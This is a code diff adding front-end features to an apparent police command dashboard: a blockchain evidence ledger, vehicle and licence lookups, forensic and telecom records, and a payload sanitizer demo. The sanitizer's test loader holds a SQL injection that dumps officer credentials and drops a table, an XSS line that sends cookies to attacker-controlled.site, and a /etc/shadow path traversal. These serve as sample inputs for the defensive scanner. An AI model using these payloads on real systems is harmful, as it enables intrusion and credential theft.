-        btn.classList.remove('bg-blue-600/15', 'text-blue-400', 'border', 'border-blue-500/20');
-        btn.classList.add('text-slate-400');
+        if (btn) {
+          btn.classList.remove('bg-blue-600/15', 'text-blue-400', 'border', 'border-blue-500/20');
+          btn.classList.add('text-slate-400');
+        }
       });
 
-      document.getElementById(`panel-${tab}`).classList.remove('hidden');
+      const activePanel = document.getElementById(`panel-${tab}`);
+      if (activePanel) activePanel.classList.remove('hidden');
       const activeBtn = document.getElementById(`tabBtn-${tab}`);
-      activeBtn.classList.add('bg-blue-600/15', 'text-blue-400', 'border', 'border-blue-500/20');
-      activeBtn.classList.remove('text-slate-400');
+      if (activeBtn) {
+        activeBtn.classList.add('bg-blue-600/15', 'text-blue-400', 'border', 'border-blue-500/20');
+        activeBtn.classList.remove('text-slate-400');
+      }
       lucide.createIcons();
 
       if (tab === 'duty') {
@@ -1236,6 +1587,12 @@
           initTacticalMap();
           if (tacticalMap) tacticalMap.invalidateSize();
         }, 150);
+      }
+      if (tab === 'blockchain') {
+        loadOfficerBlockchainBlocks();
+      }
+      if (tab === 'interagency') {
+        switchInteragencyTab('rto');
       }
     }
 
@@ -1467,10 +1824,10 @@
         .addTo(tacticalMap)
         .bindPopup('<div class="p-1 text-xs text-slate-900 font-bold">📹 CCTV Grid: Vidhana Soudha Perimeter</div>');
 
-      // Click on map to add simulated waypoints if testing
+      // Click on map to relocate or pin patrol waypoints anytime
       tacticalMap.on('click', (e) => {
-        if (!isOnDuty) return;
-        updateLocationPosition(e.latlng.lat, e.latlng.lng, 4.0, (Math.random() * 5 + 8).toFixed(1), "SIMULATED WAYPOINT");
+        updateLocationPosition(e.latlng.lat, e.latlng.lng, 3.0, (Math.random() * 4 + 6).toFixed(1), "MANUAL GPS PIN LOCK");
+        if (officerBeaconMarker) officerBeaconMarker.openPopup();
       });
 
       // Automatically acquire user's real hardware GPS or snap to Bengaluru
@@ -1526,6 +1883,453 @@
       }
     }
     window.lockDeviceGPS = lockDeviceGPS;
+
+    function selectManualSector(coordStr) {
+      if (!coordStr) return;
+      const parts = coordStr.split(',').map(Number);
+      const lat = parts[0];
+      const lng = parts[1];
+      updateLocationPosition(lat, lng, 3.2, '0.0', 'SECTOR MANUAL LOCK (BENGALURU)');
+      if (tacticalMap) {
+        tacticalMap.setView([lat, lng], 16, { animate: true });
+        if (officerBeaconMarker) officerBeaconMarker.openPopup();
+      }
+    }
+    window.selectManualSector = selectManualSector;
+
+    // --- REFINED TRAITOR SENTINEL (ITIS) ---
+    function simulateInsiderThreat() {
+      const scoreEl = document.getElementById('itisThreatScore');
+      const statusEl = document.getElementById('itisThreatStatus');
+      const noctEl = document.getElementById('itisNocturnalCount');
+      const exfilEl = document.getElementById('itisExfilCount');
+
+      if (scoreEl) scoreEl.innerHTML = `88<span class="text-sm text-red-500 font-normal">/100</span>`;
+      if (statusEl) {
+        statusEl.className = 'text-xs font-bold text-red-400 flex items-center gap-1 animate-pulse';
+        statusEl.innerHTML = `<span class="w-2 h-2 rounded-full bg-red-500 animate-ping"></span><span>STATUS: CRITICAL ANOMALY DETECTED</span>`;
+      }
+      if (noctEl) noctEl.innerHTML = `4 <span class="text-xs text-red-400 font-normal font-sans">Suspicious</span>`;
+      if (exfilEl) exfilEl.innerHTML = `1 <span class="text-xs text-red-400 font-normal font-sans">Intercepted</span>`;
+
+      const badge = document.getElementById('officerThreatBadge');
+      if (badge) {
+        badge.className = 'font-bold text-red-400 animate-pulse';
+        badge.innerText = '88/100 (CRITICAL)';
+      }
+      const pBar = document.getElementById('threatProgressBar');
+      if (pBar) {
+        pBar.className = 'bg-red-500 h-full w-[88%] transition-all duration-500';
+      }
+
+      alert('🚨 ITIS SECURITY BREACH ALERT:\n\nHigh-Risk Insider Anomaly Detected for Constable R. Shinde (CONST-KA-4102).\nBulk exfiltration attempt of sensitive ministerial CDR traces intercepted and logged onto blockchain.');
+    }
+    window.simulateInsiderThreat = simulateInsiderThreat;
+
+    function resetInsiderThreat() {
+      const scoreEl = document.getElementById('itisThreatScore');
+      const statusEl = document.getElementById('itisThreatStatus');
+      if (scoreEl) scoreEl.innerHTML = `12<span class="text-sm text-slate-500 font-normal">/100</span>`;
+      if (statusEl) {
+        statusEl.className = 'text-xs font-bold text-emerald-400 flex items-center gap-1';
+        statusEl.innerHTML = `<span class="w-2 h-2 rounded-full bg-emerald-400"></span><span>STATUS: LOW RISK</span>`;
+      }
+      const badge = document.getElementById('officerThreatBadge');
+      if (badge) {
+        badge.className = 'font-bold text-emerald-400';
+        badge.innerText = '12/100 (LOW)';
+      }
+      const pBar = document.getElementById('threatProgressBar');
+      if (pBar) {
+        pBar.className = 'bg-emerald-500 h-full w-[12%] transition-all duration-500';
+      }
+    }
+    window.resetInsiderThreat = resetInsiderThreat;
+
+    function freezeOfficerSession(badge, btn) {
+      if (btn) {
+        btn.disabled = true;
+        btn.className = 'px-3 py-1.5 bg-slate-800 text-red-400 font-mono text-xs rounded-lg border border-red-500/40';
+        btn.innerText = '🔒 SESSION FROZEN';
+      }
+      alert(`OFFICER CLEARANCE REVOKED: Enclave access for ${badge} has been instantly terminated. Active JWT keys blacklisted and terminal lock engaged.`);
+    }
+    window.freezeOfficerSession = freezeOfficerSession;
+
+    // --- POLICE OFFICER BLOCKCHAIN VAULT ---
+    async function loadOfficerBlockchainBlocks() {
+      const container = document.getElementById('officerBlocksContainer');
+      if (!container) return;
+
+      try {
+        const res = await fetch('/api/v1/citizen/blockchain/blocks');
+        const data = await res.json();
+        const blocks = data.recent_blocks || [];
+
+        container.innerHTML = blocks.map(b => `
+          <div class="p-3.5 bg-slate-900/80 border border-slate-800 rounded-xl space-y-2 hover:border-cyan-500/40 transition">
+            <div class="flex items-center justify-between">
+              <div class="flex items-center gap-2">
+                <span class="px-2 py-0.5 rounded text-[10px] font-mono font-bold bg-cyan-500/10 text-cyan-300 border border-cyan-500/30">BLOCK #${b.index}</span>
+                <span class="font-bold text-white text-xs">${b.record_id}</span>
+                <span class="text-[10px] text-slate-400 uppercase font-semibold">(${b.record_type})</span>
+              </div>
+              <span class="text-[10px] font-mono text-slate-400">${b.timestamp.slice(0, 19).replace('T', ' ')} UTC</span>
+            </div>
+            <div class="grid grid-cols-1 sm:grid-cols-2 gap-2 text-[11px] font-mono">
+              <div class="p-1.5 bg-slate-950 rounded border border-slate-800 text-cyan-300 truncate" title="Hash: ${b.block_hash}">
+                <span class="text-slate-500">Hash: </span>${b.block_hash}
+              </div>
+              <div class="p-1.5 bg-slate-950 rounded border border-slate-800 text-slate-400 truncate" title="Prev: ${b.previous_hash}">
+                <span class="text-slate-500">Prev: </span>${b.previous_hash}
+              </div>
+            </div>
+            <div class="flex items-center justify-between text-[11px] text-slate-300 pt-1">
+              <span>Evidence: <strong class="text-white">${b.data_summary}</strong></span>
+              <button onclick="setPortalMode('civilian'); showCivilianModal('blockchain'); verifyTrackingId('${b.record_id}');" class="text-cyan-400 hover:text-cyan-300 font-bold flex items-center gap-1">
+                <span>View BSA Certificate</span> →
+              </button>
+            </div>
+          </div>
+        `).join('');
+        if (window.lucide) lucide.createIcons();
+      } catch (err) {
+        container.innerHTML = `<div class="p-3 text-xs text-rose-400">Unable to load blockchain stream: ${err.message}</div>`;
+      }
+    }
+    window.loadOfficerBlockchainBlocks = loadOfficerBlockchainBlocks;
+
+    async function handleAnchorEvidence(e) {
+      e.preventDefault();
+      const caseNum = document.getElementById('evCaseNum').value.trim();
+      const tag = document.getElementById('evTag').value.trim();
+      const type = document.getElementById('evType').value;
+      const desc = document.getElementById('evDesc').value.trim();
+      const resContainer = document.getElementById('evAnchorResult');
+
+      resContainer.innerHTML = `<div class="p-3 text-xs text-cyan-400 bg-cyan-950/20 rounded-xl border border-cyan-900/30 flex items-center gap-2"><i data-lucide="loader" class="w-4 h-4 animate-spin"></i><span>Computing SHA-256 Merkle hash and mining block onto Sovereign Police Ledger...</span></div>`;
+      if (window.lucide) lucide.createIcons();
+
+      try {
+        const res = await fetch('/api/v1/interagency/blockchain/anchor-evidence', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${authToken}` },
+          body: JSON.stringify({
+            case_number: caseNum,
+            exhibit_tag: tag,
+            evidence_type: type,
+            description: desc,
+            seizing_officer: (currentOfficer && currentOfficer.full_name) ? currentOfficer.full_name : 'Command Officer'
+          })
+        });
+        const data = await res.json();
+        if (!res.ok) throw new Error(data.detail || 'Failed to anchor evidence to blockchain');
+
+        resContainer.innerHTML = `
+          <div class="p-4 bg-emerald-950/20 border border-emerald-500/40 rounded-xl space-y-2 text-xs">
+            <div class="flex items-center justify-between">
+              <span class="text-emerald-400 font-bold flex items-center gap-1.5">
+                <i data-lucide="check-circle" class="w-4 h-4"></i>
+                <span>Exhibit Successfully Anchored onto Police Ledger (Block #${data.blockchain_block})</span>
+              </span>
+              <span class="px-2 py-0.5 rounded bg-cyan-500/10 text-cyan-300 font-mono text-[10px] border border-cyan-500/30">BSA 2023 §63 PRIMARY ADMISSIBILITY</span>
+            </div>
+            <div class="font-mono text-[11px] text-cyan-300 break-all bg-slate-950 p-2 rounded border border-slate-800">
+              SHA-256 Digest: ${data.sha256_digest}
+            </div>
+            <div class="flex items-center justify-between text-[11px] pt-1">
+              <span class="text-slate-400">Certificate ID: <strong class="text-white">${data.bsa_certificate_id}</strong></span>
+              <span class="text-emerald-400 font-semibold">Ready for Court Filing (Charge Sheet Annexure)</span>
+            </div>
+          </div>
+        `;
+        loadOfficerBlockchainBlocks();
+        if (window.lucide) lucide.createIcons();
+      } catch (err) {
+        resContainer.innerHTML = `<div class="p-3 text-xs text-rose-400 bg-rose-950/20 rounded-xl border border-rose-900/30">${err.message}</div>`;
+      }
+    }
+    window.handleAnchorEvidence = handleAnchorEvidence;
+
+    // --- INTER-AGENCY MULTI-DEPARTMENT HUB ---
+    function switchInteragencyTab(subTab) {
+      ['rto', 'fsl', 'telecom', 'immunity'].forEach(t => {
+        const panel = document.getElementById(`iaPanel-${t}`);
+        if (panel) panel.classList.add('hidden');
+        const btn = document.getElementById(`iaTabBtn-${t}`);
+        if (btn) {
+          btn.className = 'px-4 py-2 rounded-xl font-semibold text-slate-400 hover:text-white flex items-center gap-1.5 transition';
+        }
+      });
+
+      const activePanel = document.getElementById(`iaPanel-${subTab}`);
+      if (activePanel) activePanel.classList.remove('hidden');
+      const activeBtn = document.getElementById(`iaTabBtn-${subTab}`);
+      if (activeBtn) {
+        activeBtn.className = 'px-4 py-2 rounded-xl font-bold text-amber-300 bg-amber-500/15 border border-amber-500/30 flex items-center gap-1.5 transition';
+      }
+
+      if (subTab === 'fsl') loadFslDossiers();
+      if (subTab === 'telecom') loadTelecomRequests();
+      if (window.lucide) lucide.createIcons();
+    }
+    window.switchInteragencyTab = switchInteragencyTab;
+
+    async function handleRtoLookup() {
+      const regInput = document.getElementById('rtoRegInput');
+      const container = document.getElementById('rtoResultContainer');
+      if (!regInput || !container) return;
+      const regNo = regInput.value.trim();
+      if (!regNo) return;
+
+      container.innerHTML = `<div class="p-3 text-xs text-amber-400 bg-amber-950/20 rounded-xl border border-amber-900/30 flex items-center gap-2"><i data-lucide="loader" class="w-4 h-4 animate-spin"></i><span>Querying National VAHAN 4.0 database & ANPR highway camera relays...</span></div>`;
+      if (window.lucide) lucide.createIcons();
+
+      try {
+        const res = await fetch(`/api/v1/interagency/rto/vehicle/${encodeURIComponent(regNo)}`);
+        const data = await res.json();
+        const r = data.record || {};
+        const isBlacklisted = (r.blacklist_status || '').includes('WANTED') || (r.blacklist_status || '').includes('HIT-AND-RUN');
+
+        container.innerHTML = `
+          <div class="p-5 ${isBlacklisted ? 'bg-red-950/30 border-2 border-red-500/60' : 'bg-slate-950/80 border border-amber-500/30'} rounded-2xl space-y-4 shadow-xl">
+            <div class="flex flex-col sm:flex-row sm:items-center justify-between border-b border-slate-800 pb-3 gap-2">
+              <div class="flex items-center gap-2.5">
+                <span class="px-3 py-1 rounded-lg bg-amber-500/20 text-amber-300 font-mono font-extrabold text-sm border border-amber-500/40">${r.reg_number}</span>
+                <div>
+                  <h4 class="font-extrabold text-white text-sm">${r.maker_model}</h4>
+                  <p class="text-[11px] text-slate-400">${r.vehicle_class} • ${r.fuel_type} • Color: ${r.color || 'White'}</p>
+                </div>
+              </div>
+              <span class="px-2.5 py-1 rounded text-xs font-bold ${isBlacklisted ? 'bg-red-600 text-white animate-pulse' : 'bg-emerald-500/15 text-emerald-400 border border-emerald-500/30'}">
+                ${r.blacklist_status}
+              </span>
+            </div>
+
+            <div class="grid grid-cols-2 sm:grid-cols-4 gap-2.5 text-xs">
+              <div class="p-2.5 bg-slate-900/90 rounded-xl">
+                <div class="text-[10px] text-slate-400 uppercase font-semibold">REGISTERED OWNER</div>
+                <div class="font-bold text-white text-xs mt-0.5">${r.owner_name}</div>
+              </div>
+              <div class="p-2.5 bg-slate-900/90 rounded-xl">
+                <div class="text-[10px] text-slate-400 uppercase font-semibold">RTO OFFICE</div>
+                <div class="font-bold text-amber-300 text-xs mt-0.5">${r.rto_office}</div>
+              </div>
+              <div class="p-2.5 bg-slate-900/90 rounded-xl">
+                <div class="text-[10px] text-slate-400 uppercase font-semibold">INSURANCE EXPIRY</div>
+                <div class="font-bold text-slate-200 text-xs mt-0.5">${r.insurance_valid_upto}</div>
+              </div>
+              <div class="p-2.5 bg-slate-900/90 rounded-xl">
+                <div class="text-[10px] text-slate-400 uppercase font-semibold">CHASSIS / ENGINE</div>
+                <div class="font-mono font-bold text-slate-300 text-[10px] mt-0.5 truncate">${r.chassis_number}</div>
+              </div>
+            </div>
+
+            <div class="p-3 bg-slate-900 rounded-xl flex items-center justify-between text-xs">
+              <div class="flex items-center gap-2">
+                <i data-lucide="camera" class="w-4 h-4 text-amber-400"></i>
+                <span><strong>ANPR Highway Last-Seen Sighting:</strong> <span class="text-slate-300">${r.anpr_last_seen} (${r.anpr_timestamp})</span></span>
+              </div>
+              <span class="text-xs font-mono font-bold ${r.pending_echallans > 0 ? 'text-rose-400' : 'text-emerald-400'}">
+                ${r.pending_echallans} e-Challan Pending
+              </span>
+            </div>
+          </div>
+        `;
+        if (window.lucide) lucide.createIcons();
+      } catch (err) {
+        container.innerHTML = `<div class="p-3 text-xs text-rose-400 bg-rose-950/20 rounded-xl border border-rose-900/30">${err.message}</div>`;
+      }
+    }
+    window.handleRtoLookup = handleRtoLookup;
+
+    async function handleDlLookup() {
+      const dlInput = document.getElementById('sarathiDlInput');
+      const container = document.getElementById('dlResultContainer');
+      if (!dlInput || !container) return;
+      const dlNo = dlInput.value.trim();
+      if (!dlNo) return;
+
+      container.innerHTML = `<div class="p-3 text-xs text-blue-400 bg-blue-950/20 rounded-xl">Querying SARATHI 4.0 database...</div>`;
+      try {
+        const res = await fetch(`/api/v1/interagency/rto/dl/${encodeURIComponent(dlNo)}`);
+        const data = await res.json();
+        const r = data.record || {};
+
+        container.innerHTML = `
+          <div class="p-4 bg-slate-950 border border-blue-500/30 rounded-xl text-xs space-y-2">
+            <div class="flex items-center justify-between">
+              <div class="font-bold text-white text-sm">${r.holder_name} (S/O ${r.father_name})</div>
+              <span class="px-2 py-0.5 rounded bg-emerald-500/15 text-emerald-400 border border-emerald-500/30 text-[10px] font-bold">${r.status}</span>
+            </div>
+            <div class="grid grid-cols-2 sm:grid-cols-4 gap-2 text-[11px]">
+              <div><span class="text-slate-500">DL NUMBER:</span> <div class="font-mono font-bold text-blue-300">${r.dl_number}</div></div>
+              <div><span class="text-slate-500">DOB:</span> <div class="text-slate-200">${r.date_of_birth} (Blood: ${r.blood_group})</div></div>
+              <div><span class="text-slate-500">VALID UPTO:</span> <div class="text-emerald-400 font-bold">${r.validity_non_transport}</div></div>
+              <div><span class="text-slate-500">BIOMETRIC:</span> <div class="text-emerald-400">${r.biometric_status}</div></div>
+            </div>
+          </div>
+        `;
+      } catch (e) {
+        container.innerHTML = `<div class="p-3 text-xs text-rose-400">${e.message}</div>`;
+      }
+    }
+    window.handleDlLookup = handleDlLookup;
+
+    async function loadFslDossiers() {
+      const container = document.getElementById('fslListContainer');
+      if (!container) return;
+
+      try {
+        const res = await fetch('/api/v1/interagency/fsl/dossiers');
+        const data = await res.json();
+        const dossiers = data.dossiers || [];
+
+        container.innerHTML = dossiers.map(d => `
+          <div class="p-4 bg-slate-950/80 border border-purple-500/30 rounded-xl space-y-2">
+            <div class="flex items-center justify-between">
+              <div class="flex items-center gap-2">
+                <span class="px-2 py-0.5 rounded bg-purple-500/20 text-purple-300 font-mono text-[10px] font-bold">${d.dossier_id}</span>
+                <span class="font-bold text-white text-xs">${d.case_number}</span>
+                <span class="text-[10px] text-slate-400 uppercase">(${d.evidence_type})</span>
+              </div>
+              <span class="px-2 py-0.5 rounded bg-emerald-500/15 text-emerald-400 text-[10px] font-bold">${d.status}</span>
+            </div>
+            <p class="text-slate-300 text-xs">${d.description}</p>
+            <div class="p-2 bg-slate-900 rounded font-mono text-[11px] text-purple-300 break-all">
+              <span class="text-slate-500">Forensic SHA-256 Clone Hash:</span> ${d.sha256_hash}
+            </div>
+            <div class="flex items-center justify-between text-[11px] text-slate-400 pt-1">
+              <span>Lab: <strong>${d.laboratory}</strong></span>
+              <span class="text-emerald-400 font-semibold">✓ BSA 2023 §63 Certified</span>
+            </div>
+          </div>
+        `).join('');
+      } catch (e) {
+        container.innerHTML = `<div class="p-3 text-xs text-rose-400">Failed to load FSL dossiers</div>`;
+      }
+    }
+    window.loadFslDossiers = loadFslDossiers;
+
+    async function loadTelecomRequests() {
+      const container = document.getElementById('telecomListContainer');
+      if (!container) return;
+
+      try {
+        const res = await fetch('/api/v1/interagency/telecom/cdr');
+        const data = await res.json();
+        const requests = data.requests || [];
+
+        container.innerHTML = requests.map(r => `
+          <div class="p-4 bg-slate-950/80 border border-blue-500/30 rounded-xl space-y-2">
+            <div class="flex items-center justify-between">
+              <div class="flex items-center gap-2">
+                <span class="px-2 py-0.5 rounded bg-blue-500/20 text-blue-300 font-mono text-[10px] font-bold">${r.request_id}</span>
+                <span class="font-bold text-white text-xs">Target: ${r.target_msisdn}</span>
+              </div>
+              <span class="px-2 py-0.5 rounded bg-emerald-500/15 text-emerald-400 text-[10px] font-bold">${r.status}</span>
+            </div>
+            <div class="grid grid-cols-1 sm:grid-cols-2 gap-2 text-[11px] text-slate-300">
+              <div><span class="text-slate-500">Operator:</span> ${r.operator}</div>
+              <div><span class="text-slate-500">Warrant Authority:</span> ${r.warrant_auth}</div>
+            </div>
+            <div class="text-[11px] text-slate-400">Covered Cellular Towers: <strong class="text-slate-200">${(r.tower_ids || []).join(', ')}</strong></div>
+          </div>
+        `).join('');
+      } catch (e) {
+        container.innerHTML = `<div class="p-3 text-xs text-rose-400">Failed to load telecom traces</div>`;
+      }
+    }
+    window.loadTelecomRequests = loadTelecomRequests;
+
+    function loadTestAttackPayload(type) {
+      const input = document.getElementById('sanitizerInput');
+      if (!input) return;
+      if (type === 1) {
+        input.value = "SELECT * FROM cases WHERE case_id=101 UNION SELECT password, pin, auth_token FROM officers; DROP TABLE evidence_vault; --";
+      } else if (type === 2) {
+        input.value = "<script>fetch('http://attacker-controlled.site/steal?cookie='+document.cookie)<" + "/script><img src=x onerror=alert('zero-day-compromise')>";
+      } else if (type === 3) {
+        input.value = "../../../../etc/shadow%00malicious_root_exploit_payload_attempt";
+      }
+    }
+    window.loadTestAttackPayload = loadTestAttackPayload;
+
+    async function runCyberImmunityScan() {
+      const input = document.getElementById('sanitizerInput');
+      const container = document.getElementById('sanitizerResultContainer');
+      if (!input || !container) return;
+      const rawText = input.value.trim();
+      if (!rawText) return;
+
+      container.innerHTML = `<div class="p-3 text-xs text-emerald-400 bg-emerald-950/20 rounded-xl border border-emerald-500/30 flex items-center gap-2"><i data-lucide="loader" class="w-4 h-4 animate-spin"></i><span>Running Deep Packet Inspection & Antivirus sanitization against National Central Database Gateway...</span></div>`;
+      if (window.lucide) lucide.createIcons();
+
+      try {
+        const res = await fetch('/api/v1/interagency/sanitizer/scan', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            record_payload: rawText,
+            source_database: 'CENTRAL_CCTNS_NATIONAL_GATEWAY',
+            target_table: 'CRIME_RECORDS_CENTRAL'
+          })
+        });
+        const data = await res.json();
+
+        const threatListHtml = (data.threats_neutralized || []).map(t => `
+          <li class="flex items-center gap-1.5 text-rose-300">
+            <i data-lucide="alert-triangle" class="w-3.5 h-3.5 text-rose-400 shrink-0"></i>
+            <span>${t}</span>
+          </li>
+        `).join('');
+
+        container.innerHTML = `
+          <div class="p-5 bg-gradient-to-br from-slate-950 via-[#061214] to-slate-950 border-2 border-emerald-500/50 rounded-2xl space-y-4 shadow-2xl">
+            <div class="flex items-center justify-between border-b border-emerald-500/30 pb-3">
+              <div class="flex items-center gap-2">
+                <i data-lucide="shield-check" class="w-5 h-5 text-emerald-400"></i>
+                <span class="font-extrabold text-white text-sm">Deep Packet Inspection: ${data.antivirus_filter_result}</span>
+              </div>
+              <span class="px-2.5 py-1 rounded bg-emerald-500/20 text-emerald-300 border border-emerald-500/40 font-mono text-xs font-bold">
+                ${data.threats_detected_count} THREATS NEUTRALIZED
+              </span>
+            </div>
+
+            <!-- Threat report -->
+            <div class="p-3 bg-red-950/30 border border-red-800/50 rounded-xl space-y-1.5 text-xs">
+              <div class="font-bold text-red-200">Malicious Code & Attack Vectors Disinfected:</div>
+              <ul class="space-y-1 pl-1">
+                ${threatListHtml}
+              </ul>
+            </div>
+
+            <!-- Sanitized Clean Output -->
+            <div class="space-y-1 text-xs">
+              <span class="text-slate-400 uppercase font-semibold text-[10px]">SANITIZED CLEAN PAYLOAD (DELIVERED TO DATABASE):</span>
+              <div class="p-2.5 bg-slate-900 rounded-lg font-mono text-emerald-300 text-xs break-all">
+                ${data.sanitized_payload_preview}
+              </div>
+            </div>
+
+            <!-- Blockchain Anchor Confirmation -->
+            <div class="p-3 bg-slate-900/90 rounded-xl border border-cyan-500/30 flex items-center justify-between text-xs font-mono">
+              <div>
+                <span class="text-slate-400 text-[10px]">ANCHORED TO BLOCKCHAIN:</span>
+                <div class="text-cyan-300 font-bold">Block #${data.blockchain_block} (${data.blockchain_hash.slice(0, 24)}...)</div>
+              </div>
+              <span class="text-emerald-400 text-[11px] font-bold">100% IMMUNE & HEALED</span>
+            </div>
+
+            <p class="text-[11px] text-slate-400 italic">${data.immunity_guarantee}</p>
+          </div>
+        `;
+        if (window.lucide) lucide.createIcons();
+      } catch (err) {
+        container.innerHTML = `<div class="p-3 text-xs text-rose-400 bg-rose-950/20 rounded-xl">${err.message}</div>`;
+      }
+    }
+    window.runCyberImmunityScan = runCyberImmunityScan;
 
     function recenterTacticalMap() {
       if (tacticalMap && officerBeaconMarker) {
